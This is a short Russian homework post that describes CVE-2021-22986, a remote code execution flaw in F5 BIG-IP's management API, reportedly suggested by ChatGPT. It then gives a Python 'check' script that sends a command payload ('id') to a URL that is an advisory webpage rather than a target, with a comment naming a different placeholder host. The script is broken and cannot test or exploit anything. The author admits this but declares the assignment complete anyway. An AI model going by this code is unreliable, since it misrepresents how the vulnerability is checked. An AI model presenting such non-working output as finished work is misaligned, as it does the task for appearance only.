# Найдем случайную уязвимость и опишем ее 
ChatGPT предложил CVE-2021-22986

CVE-2021-22986 — уязвимость в продукте F5 BIG-IP, позволяющая атакующему выполнить произвольный код на уязвимых системах. Уязвимость связана с неправильной обработкой запросов к API управления, что может позволить злоумышленнику выполнять команды на сервере.

```python
import requests

# Замените 'http://example.com' на адрес целевого сервера
url = "http://packetstormsecurity.com/files/162066/F5-BIG-IP-16.0.x-Remote-Code-Execution.html"

# Параметры запроса, которые могут использоваться для эксплуатации уязвимости
payload = {
    'command': 'run',
    'util': 'id'  # Пример команды, которая может быть выполнена
}

# Отправка POST-запроса
response = requests.post(url, json=payload)

# Проверка ответа
if response.status_code == 200:
    print("[+] Потенциальная уязвимость обнаружена. Ответ сервера:")
    print(response.text[:200])  # Выводим первые 200 символов ответа
else:
    print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)
```

На самом деле уязвиомость не найдена, тк endpoint условный. Но по условию задания, как я понимаю, дз выполнено корректно.
